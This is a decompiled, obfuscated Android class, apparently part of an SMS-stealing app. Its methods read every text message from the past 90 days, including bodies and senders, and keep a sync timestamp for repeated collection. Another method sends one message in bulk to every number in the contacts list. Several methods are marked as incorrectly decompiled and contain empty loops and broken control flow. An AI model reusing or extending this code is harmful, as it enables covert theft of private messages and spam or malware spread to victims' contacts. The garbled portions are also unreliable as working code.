package com.storm.safe.rock.service.modules;

import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.Locale;
import kotlin.AbstractC0767a0;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0720jj;
import p000.AbstractC1117qo;
import p000.C1214s9;
import p000.b11;
import p000.t60;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.a9 */
/* loaded from: classes2.dex */
public final class C0324a9 {

    /* renamed from: a3 */
    public static final String f53140a3;

    /* renamed from: a4 */
    public static final String f53141a4;

    /* renamed from: a0 */
    public final dqtvuisjd f53142a0;

    /* renamed from: a1 */
    public final SimpleDateFormat f53143a1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    /* renamed from: a2 */
    public final y90 f53144a2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.SmsModule$syncPrefs$2
        {
            super(0);
        }

        @Override // p000.w00
        public final Object invoke() {
            return this.f52887a0.f53142a0.getSharedPreferences(C0324a9.f53140a3, 0);
        }
    });

    static {
        new b11(null);
        f53140a3 = StringUtil.m212470a0("OFQCBV4hAi1oITlcFyk=");
        f53141a4 = StringUtil.m212470a0("J1gCLnIrFSBUDi9YBT8=");
    }

    public C0324a9(dqtvuisjd dqtvuisjdVar) {
        this.f53142a0 = dqtvuisjdVar;
    }

    /* renamed from: a0 */
    public final SmsManager m211675a0() {
        if (Build.VERSION.SDK_INT >= 31) {
            Object systemService = this.f53142a0.getSystemService((Class<Object>) SmsManager.class);
            t60.m214694b5(systemService, "{\n            context.ge…er::class.java)\n        }");
            return (SmsManager) systemService;
        }
        SmsManager smsManager = SmsManager.getDefault();
        t60.m214694b5(smsManager, "{\n            @Suppress(…er.getDefault()\n        }");
        return smsManager;
    }

    /* JADX WARN: Removed duplicated region for block: B:102:0x0243 A[LOOP:1: B:101:0x0241->B:102:0x0243, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:105:0x0259  */
    /* JADX WARN: Removed duplicated region for block: B:109:0x0271 A[LOOP:2: B:107:0x026b->B:109:0x0271, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:22:0x0071  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x01ce  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x01f5  */
    /* JADX WARN: Unreachable blocks removed: 3, instructions: 3 */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final JSONArray m211676a1(int i) throws Throwable {
        Uri uri;
        LinkedHashSet linkedHashSet;
        JSONArray jSONArray;
        String str;
        ArrayList arrayList;
        int length;
        int i2;
        Iterator it;
        LinkedHashSet linkedHashSet2;
        String str2;
        String str3 = "type";
        JSONArray jSONArray2 = new JSONArray();
        LinkedHashSet linkedHashSet3 = new LinkedHashSet();
        dqtvuisjd dqtvuisjdVar = this.f53142a0;
        if (AbstractC1117qo.m214411a7(dqtvuisjdVar, "android.permission.READ_SMS") != 0) {
            t60.m214726f4("SmsModule", "没有读取短信权限");
            return jSONArray2;
        }
        String str4 = "read";
        String lowerCase = "all".toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int iHashCode = lowerCase.hashCode();
        JSONArray jSONArray3 = jSONArray2;
        if (iHashCode != 3526552) {
            if (iHashCode != 95844769) {
                uri = (iHashCode == 100344454 && lowerCase.equals("inbox")) ? Telephony.Sms.Inbox.CONTENT_URI : Telephony.Sms.CONTENT_URI;
            } else if (lowerCase.equals("draft")) {
                uri = Telephony.Sms.Draft.CONTENT_URI;
            }
        } else if (lowerCase.equals("sent")) {
            uri = Telephony.Sms.Sent.CONTENT_URI;
        }
        Uri uri2 = uri;
        Cursor cursor = null;
        try {
            try {
                Cursor cursorQuery = dqtvuisjdVar.getContentResolver().query(uri2, new String[]{"_id", "address", "body", "date", "type", "read", "thread_id"}, "date >= ?", new String[]{String.valueOf(System.currentTimeMillis() - 7776000000L)}, "date DESC LIMIT " + i + " OFFSET 0");
                if (cursorQuery != null) {
                    try {
                        try {
                            int columnIndex = cursorQuery.getColumnIndex("_id");
                            int columnIndex2 = cursorQuery.getColumnIndex("address");
                            int columnIndex3 = cursorQuery.getColumnIndex("body");
                            int columnIndex4 = cursorQuery.getColumnIndex("date");
                            int columnIndex5 = cursorQuery.getColumnIndex("type");
                            int columnIndex6 = cursorQuery.getColumnIndex("read");
                            int columnIndex7 = cursorQuery.getColumnIndex("thread_id");
                            while (cursorQuery.moveToNext()) {
                                String str5 = str3;
                                long j = cursorQuery.getLong(columnIndex);
                                int i3 = columnIndex;
                                if (linkedHashSet3.contains(Long.valueOf(j))) {
                                    str3 = str5;
                                    columnIndex = i3;
                                } else {
                                    linkedHashSet3.add(Long.valueOf(j));
                                    linkedHashSet = linkedHashSet3;
                                    String str6 = str4;
                                    try {
                                        long j2 = cursorQuery.getLong(columnIndex4);
                                        JSONObject jSONObject = new JSONObject();
                                        int i4 = columnIndex4;
                                        jSONObject.put("id", j);
                                        String string = cursorQuery.getString(columnIndex2);
                                        String str7 = "";
                                        if (string == null) {
                                            string = "";
                                        }
                                        jSONObject.put("address", string);
                                        String string2 = cursorQuery.getString(columnIndex3);
                                        if (string2 != null) {
                                            str7 = string2;
                                        }
                                        jSONObject.put("body", str7);
                                        jSONObject.put("date", j2);
                                        jSONObject.put("dateFormatted", this.f53143a1.format(new Date(j2)));
                                        switch (cursorQuery.getInt(columnIndex5)) {
                                            case 1:
                                                str2 = "inbox";
                                                break;
                                            case 2:
                                                str2 = "sent";
                                                break;
                                            case 3:
                                                str2 = "draft";
                                                break;
                                            case 4:
                                                str2 = "outbox";
                                                break;
                                            case 5:
                                                str2 = "failed";
                                                break;
                                            case 6:
                                                str2 = "queued";
                                                break;
                                            default:
                                                str2 = "unknown";
                                                break;
                                        }
                                        str3 = str5;
                                        jSONObject.put(str3, str2);
                                        jSONObject.put(str6, cursorQuery.getInt(columnIndex6) == 1);
                                        jSONObject.put("threadId", cursorQuery.getLong(columnIndex7));
                                        jSONObject.put("source", "standard");
                                        jSONArray = jSONArray3;
                                        try {
                                            jSONArray.put(jSONObject);
                                            str4 = str6;
                                            jSONArray3 = jSONArray;
                                            columnIndex = i3;
                                            linkedHashSet3 = linkedHashSet;
                                            columnIndex4 = i4;
                                        } catch (Exception e) {
                                            e = e;
                                            cursor = cursorQuery;
                                            str = "SmsModule";
                                            t60.m214705c6(str, "❌ 读取标准短信失败", e);
                                            if (cursor != null) {
                                                cursor.close();
                                            }
                                            while (r2.hasNext()) {
                                            }
                                            JSONArray jSONArray4 = new JSONArray();
                                            arrayList = new ArrayList();
                                            length = jSONArray.length();
                                            while (i2 < length) {
                                            }
                                            if (arrayList.size() > 1) {
                                            }
                                            it = AbstractC0715je.m213301i8(arrayList, i).iterator();
                                            while (it.hasNext()) {
                                            }
                                            return jSONArray4;
                                        }
                                    } catch (Exception e2) {
                                        e = e2;
                                        jSONArray = jSONArray3;
                                        cursor = cursorQuery;
                                        str = "SmsModule";
                                        t60.m214705c6(str, "❌ 读取标准短信失败", e);
                                        if (cursor != null) {
                                        }
                                        while (r2.hasNext()) {
                                        }
                                        JSONArray jSONArray42 = new JSONArray();
                                        arrayList = new ArrayList();
                                        length = jSONArray.length();
                                        while (i2 < length) {
                                        }
                                        if (arrayList.size() > 1) {
                                        }
                                        it = AbstractC0715je.m213301i8(arrayList, i).iterator();
                                        while (it.hasNext()) {
                                        }
                                        return jSONArray42;
                                    }
                                }
                            }
                        } catch (Exception e3) {
                            e = e3;
                            linkedHashSet = linkedHashSet3;
                        }
                    } catch (Throwable th) {
                        th = th;
                        cursor = cursorQuery;
                        if (cursor != null) {
                            cursor.close();
                        }
                        throw th;
                    }
                }
                linkedHashSet = linkedHashSet3;
                jSONArray = jSONArray3;
                if (cursorQuery != null) {
                    cursorQuery.close();
                }
                str = "SmsModule";
            } catch (Throwable th2) {
                th = th2;
            }
        } catch (Exception e4) {
            e = e4;
            linkedHashSet = linkedHashSet3;
            jSONArray = jSONArray3;
        }
        for (Uri uri3 : AbstractC0716jf.m213306g5(Uri.parse("content://sms/inbox"), Uri.parse("content://sms"), Uri.parse("content://mms-sms/conversations"))) {
            try {
                t60.m214694b5(uri3, "uri");
                linkedHashSet2 = linkedHashSet;
            } catch (Exception e5) {
                e = e5;
                linkedHashSet2 = linkedHashSet;
            }
            try {
                m211678a3(uri3, i, jSONArray, linkedHashSet2);
            } catch (Exception e6) {
                e = e6;
                t60.m214726f4(str, "尝试读取 " + uri3 + " 失败: " + e.getMessage());
                linkedHashSet = linkedHashSet2;
            }
            linkedHashSet = linkedHashSet2;
        }
        JSONArray jSONArray422 = new JSONArray();
        arrayList = new ArrayList();
        length = jSONArray.length();
        for (i2 = 0; i2 < length; i2++) {
            JSONObject jSONObject2 = jSONArray.getJSONObject(i2);
            t60.m214694b5(jSONObject2, "smsList.getJSONObject(i)");
            arrayList.add(jSONObject2);
        }
        if (arrayList.size() > 1) {
            AbstractC0720jj.m213313h1(arrayList, new C1214s9(11));
        }
        it = AbstractC0715je.m213301i8(arrayList, i).iterator();
        while (it.hasNext()) {
            jSONArray422.put((JSONObject) it.next());
        }
        return jSONArray422;
    }

    /* renamed from: a2 */
    public final SmsManager m211677a2(int i) {
        SmsManager smsManagerM211675a0;
        dqtvuisjd dqtvuisjdVar = this.f53142a0;
        try {
            int i2 = Build.VERSION.SDK_INT;
            if (AbstractC1117qo.m214411a7(dqtvuisjdVar, "android.permission.READ_PHONE_STATE") == 0) {
                Object systemService = dqtvuisjdVar.getSystemService("telephony_subscription_service");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.telephony.SubscriptionManager");
                SubscriptionInfo activeSubscriptionInfoForSimSlotIndex = ((SubscriptionManager) systemService).getActiveSubscriptionInfoForSimSlotIndex(i);
                smsManagerM211675a0 = activeSubscriptionInfoForSimSlotIndex != null ? i2 >= 31 ? ((SmsManager) dqtvuisjdVar.getSystemService(SmsManager.class)).createForSubscriptionId(activeSubscriptionInfoForSimSlotIndex.getSubscriptionId()) : SmsManager.getSmsManagerForSubscriptionId(activeSubscriptionInfoForSimSlotIndex.getSubscriptionId()) : m211675a0();
            } else {
                smsManagerM211675a0 = m211675a0();
            }
            t60.m214694b5(smsManagerM211675a0, "{\n            if (Build.…)\n            }\n        }");
            return smsManagerM211675a0;
        } catch (Exception unused) {
            t60.m214695b6("⚠️ 获取SIM" + (i + 1) + "的SmsManager失败，使用默认", "msg");
            return m211675a0();
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:105:0x0208  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x018e  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x01ea A[PHI: r16
      0x01ea: PHI (r16v4 android.database.Cursor) = (r16v3 android.database.Cursor), (r16v5 android.database.Cursor) binds: [B:98:0x01e8, B:101:0x0202] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211678a3(Uri uri, int i, JSONArray jSONArray, LinkedHashSet linkedHashSet) throws Throwable {
        String str;
        Uri uri2;
        String str2;
        Cursor cursor;
        long jCurrentTimeMillis;
        String str3;
        String str4;
        int i2;
        int i3;
        int i4;
        int i5;
        Object obj;
        String str5;
        String str6;
        String str7;
        String string;
        int i6 = i;
        LinkedHashSet linkedHashSet2 = linkedHashSet;
        String str8 = "read";
        String str9 = "type";
        long jCurrentTimeMillis2 = System.currentTimeMillis() - 7776000000L;
        Cursor cursor2 = null;
        try {
            try {
                Cursor cursorQuery = this.f53142a0.getContentResolver().query(uri, null, "date >= ?", new String[]{String.valueOf(jCurrentTimeMillis2)}, "date DESC LIMIT " + i6);
                if (cursorQuery != null) {
                    try {
                        try {
                            int columnIndex = cursorQuery.getColumnIndex("_id");
                            int columnIndex2 = cursorQuery.getColumnIndex("address");
                            int columnIndex3 = cursorQuery.getColumnIndex("body");
                            int columnIndex4 = cursorQuery.getColumnIndex("date");
                            str = "SmsModule";
                            try {
                                int columnIndex5 = cursorQuery.getColumnIndex("type");
                                int columnIndex6 = cursorQuery.getColumnIndex("read");
                                if (columnIndex < 0 || columnIndex3 < 0) {
                                    cursorQuery.close();
                                    return;
                                }
                                Object obj2 = "notification";
                                int i7 = 0;
                                while (cursorQuery.moveToNext() && i7 < i6) {
                                    if (columnIndex >= 0) {
                                        try {
                                            jCurrentTimeMillis = cursorQuery.getLong(columnIndex);
                                            str3 = str8;
                                            str4 = str9;
                                        } catch (SecurityException unused) {
                                            uri2 = uri;
                                            cursor2 = cursorQuery;
                                            str2 = str;
                                            t60.m214726f4(str2, "无权访问 " + uri2);
                                            if (cursor2 != null) {
                                            }
                                        } catch (Exception e) {
                                            e = e;
                                            cursor2 = cursorQuery;
                                            t60.m214726f4(str, "读取 " + uri + " 失败: " + e.getMessage());
                                            if (cursor2 != null) {
                                            }
                                        } catch (Throwable th) {
                                            th = th;
                                            cursor2 = cursorQuery;
                                            if (cursor2 != null) {
                                            }
                                            throw th;
                                        }
                                    } else {
                                        str3 = str8;
                                        str4 = str9;
                                        jCurrentTimeMillis = System.currentTimeMillis() + i7;
                                    }
                                    long j = jCurrentTimeMillis;
                                    if (linkedHashSet2.contains(Long.valueOf(j))) {
                                        cursor = cursorQuery;
                                        i2 = columnIndex;
                                        i3 = columnIndex2;
                                        i4 = columnIndex3;
                                        i5 = columnIndex4;
                                        obj = obj2;
                                        str5 = str3;
                                        str6 = str4;
                                    } else {
                                        String string2 = columnIndex3 >= 0 ? cursorQuery.getString(columnIndex3) : null;
                                        if (string2 != null && !AbstractC0779a1.m213663b6(string2)) {
                                            i2 = columnIndex;
                                            linkedHashSet2.add(Long.valueOf(j));
                                            int i8 = columnIndex3;
                                            i5 = columnIndex4;
                                            long j2 = columnIndex4 >= 0 ? cursorQuery.getLong(columnIndex4) : System.currentTimeMillis();
                                            String str10 = "通知";
                                            if (columnIndex2 >= 0 && (string = cursorQuery.getString(columnIndex2)) != null) {
                                                str10 = string;
                                            }
                                            i4 = i8;
                                            String str11 = str10;
                                            i3 = columnIndex2;
                                            boolean z = true;
                                            int i9 = columnIndex5 >= 0 ? cursorQuery.getInt(columnIndex5) : 1;
                                            if (columnIndex6 >= 0 && cursorQuery.getInt(columnIndex6) != 1) {
                                                z = false;
                                            }
                                            JSONObject jSONObject = new JSONObject();
                                            cursor = cursorQuery;
                                            try {
                                                jSONObject.put("id", j);
                                                jSONObject.put("address", str11);
                                                jSONObject.put("body", string2);
                                                jSONObject.put("date", j2);
                                                jSONObject.put("dateFormatted", this.f53143a1.format(new Date(j2)));
                                                switch (i9) {
                                                    case 1:
                                                        str7 = "inbox";
                                                        break;
                                                    case 2:
                                                        str7 = "sent";
                                                        break;
                                                    case 3:
                                                        str7 = "draft";
                                                        break;
                                                    case 4:
                                                        str7 = "outbox";
                                                        break;
                                                    case 5:
                                                        str7 = "failed";
                                                        break;
                                                    case 6:
                                                        str7 = "queued";
                                                        break;
                                                    default:
                                                        str7 = "unknown";
                                                        break;
                                                }
                                                str6 = str4;
                                                jSONObject.put(str6, str7);
                                                str5 = str3;
                                                jSONObject.put(str5, z);
                                                jSONObject.put("threadId", 0);
                                                obj = obj2;
                                                jSONObject.put("source", obj);
                                                jSONArray.put(jSONObject);
                                                i7++;
                                            } catch (SecurityException unused2) {
                                                uri2 = uri;
                                                str2 = str;
                                                cursor2 = cursor;
                                                t60.m214726f4(str2, "无权访问 " + uri2);
                                                if (cursor2 != null) {
                                                    cursor2.close();
                                                }
                                            } catch (Exception e2) {
                                                e = e2;
                                                cursor2 = cursor;
                                                t60.m214726f4(str, "读取 " + uri + " 失败: " + e.getMessage());
                                                if (cursor2 != null) {
                                                }
                                            } catch (Throwable th2) {
                                                th = th2;
                                                cursor2 = cursor;
                                                if (cursor2 != null) {
                                                    cursor2.close();
                                                }
                                                throw th;
                                            }
                                        }
                                    }
                                    linkedHashSet2 = linkedHashSet;
                                    str8 = str5;
                                    str9 = str6;
                                    obj2 = obj;
                                    columnIndex = i2;
                                    columnIndex4 = i5;
                                    columnIndex2 = i3;
                                    columnIndex3 = i4;
                                    cursorQuery = cursor;
                                    i6 = i;
                                }
                            } catch (SecurityException unused3) {
                                cursor = cursorQuery;
                            } catch (Exception e3) {
                                e = e3;
                                cursor = cursorQuery;
                            }
                        } catch (Throwable th3) {
                            th = th3;
                            cursor = cursorQuery;
                        }
                    } catch (SecurityException unused4) {
                        cursor = cursorQuery;
                        uri2 = uri;
                        str2 = "SmsModule";
                    } catch (Exception e4) {
                        e = e4;
                        cursor = cursorQuery;
                        str = "SmsModule";
                    }
                }
                Cursor cursor3 = cursorQuery;
                if (cursor3 != null) {
                    cursor3.close();
                }
            } catch (Throwable th4) {
                th = th4;
            }
        } catch (SecurityException unused5) {
            uri2 = uri;
            str2 = "SmsModule";
        } catch (Exception e5) {
            e = e5;
            str = "SmsModule";
        }
    }

    /* renamed from: a4 */
    public final boolean m211679a4(String str, int i, String str2) {
        dqtvuisjd dqtvuisjdVar = this.f53142a0;
        if (AbstractC1117qo.m214411a7(dqtvuisjdVar, "android.permission.SEND_SMS") != 0) {
            t60.m214726f4("SmsModule", "❌ 没有发送短信权限");
            return false;
        }
        if (AbstractC0779a1.m213663b6(str) || AbstractC0779a1.m213663b6(str2)) {
            t60.m214726f4("SmsModule", "❌ 手机号或短信内容为空");
            return false;
        }
        try {
            SmsManager smsManagerM211677a2 = m211677a2(i);
            ArrayList<String> arrayListDivideMessage = smsManagerM211677a2.divideMessage(str2);
            PendingIntent broadcast = PendingIntent.getBroadcast(dqtvuisjdVar, 0, new Intent(dqtvuisjdVar.getPackageName() + ".SMS_SENT"), 67108864);
            PendingIntent broadcast2 = PendingIntent.getBroadcast(dqtvuisjdVar, 0, new Intent(dqtvuisjdVar.getPackageName() + ".SMS_DELIVERED"), 67108864);
            if (arrayListDivideMessage.size() == 1) {
                smsManagerM211677a2.sendTextMessage(str, null, str2, broadcast, broadcast2);
                return true;
            }
            ArrayList<PendingIntent> arrayList = new ArrayList<>();
            int size = arrayListDivideMessage.size();
            for (int i2 = 0; i2 < size; i2++) {
                arrayList.add(broadcast);
            }
            ArrayList<PendingIntent> arrayList2 = new ArrayList<>();
            int size2 = arrayListDivideMessage.size();
            for (int i3 = 0; i3 < size2; i3++) {
                arrayList2.add(broadcast2);
            }
            smsManagerM211677a2.sendMultipartTextMessage(str, null, arrayListDivideMessage, arrayList, arrayList2);
            return true;
        } catch (Exception e) {
            t60.m214705c6("SmsModule", "❌ 发送短信失败", e);
            return false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:45:0x00af A[PHI: r1 r4
      0x00af: PHI (r1v7 android.database.Cursor) = (r1v8 android.database.Cursor), (r1v9 android.database.Cursor) binds: [B:47:0x00b8, B:44:0x00ad] A[DONT_GENERATE, DONT_INLINE]
      0x00af: PHI (r4v1 int) = (r4v3 int), (r4v4 int) binds: [B:47:0x00b8, B:44:0x00ad] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final int m211680a5(int i, String str) {
        Exception exc;
        dqtvuisjd dqtvuisjdVar = this.f53142a0;
        int i2 = 0;
        if (AbstractC1117qo.m214411a7(dqtvuisjdVar, "android.permission.SEND_SMS") != 0 || AbstractC1117qo.m214411a7(dqtvuisjdVar, "android.permission.READ_CONTACTS") != 0) {
            t60.m214726f4("SmsModule", "❌ 没有发送短信或读取通讯录权限");
            return 0;
        }
        if (AbstractC0779a1.m213663b6(str)) {
            t60.m214726f4("SmsModule", "❌ 短信内容为空");
            return 0;
        }
        Cursor cursorQuery = null;
        try {
            try {
                cursorQuery = dqtvuisjdVar.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"data1"}, null, null, null);
                LinkedHashSet linkedHashSet = new LinkedHashSet();
                if (cursorQuery != null) {
                    int columnIndex = cursorQuery.getColumnIndex("data1");
                    int i3 = 0;
                    while (cursorQuery.moveToNext()) {
                        try {
                            String string = cursorQuery.getString(columnIndex);
                            if (string != null) {
                                String strM213647a3 = new Regex("[^0-9+]").m213647a3(string, "");
                                if (strM213647a3.length() >= 6 && !AbstractC0779a1.m213652a5(strM213647a3, "*", false) && !AbstractC0779a1.m213652a5(strM213647a3, "#", false) && !linkedHashSet.contains(strM213647a3)) {
                                    try {
                                        if (m211679a4(strM213647a3, i, str)) {
                                            i3++;
                                            linkedHashSet.add(strM213647a3);
                                        }
                                        Thread.sleep(500L);
                                    } catch (Exception e) {
                                        t60.m214705c6("SmsModule", "❌ 群发失败: " + strM213647a3, e);
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            exc = e2;
                            i2 = i3;
                            t60.m214705c6("SmsModule", "❌ 群发短信失败", exc);
                            if (cursorQuery != null) {
                            }
                            return i2;
                        }
                    }
                    i2 = i3;
                }
            } finally {
            }
        } catch (Exception e3) {
            exc = e3;
        }
        if (cursorQuery != null) {
            cursorQuery.close();
        }
        return i2;
    }

    /* renamed from: a6 */
    public final void m211681a6(JSONArray jSONArray) {
        y90 y90Var = this.f53144a2;
        SharedPreferences sharedPreferences = (SharedPreferences) y90Var.getValue();
        String str = f53141a4;
        long j = sharedPreferences.getLong(str, 0L);
        int length = jSONArray.length();
        for (int i = 0; i < length; i++) {
            long jOptLong = jSONArray.getJSONObject(i).optLong("date", 0L);
            if (jOptLong > j) {
                j = jOptLong;
            }
        }
        if (j > 0) {
            ((SharedPreferences) y90Var.getValue()).edit().putLong(str, j).apply();
            t60.m214714d6("SmsModule", "同步时间戳已更新: " + this.f53143a1.format(new Date(j)));
        }
    }
}
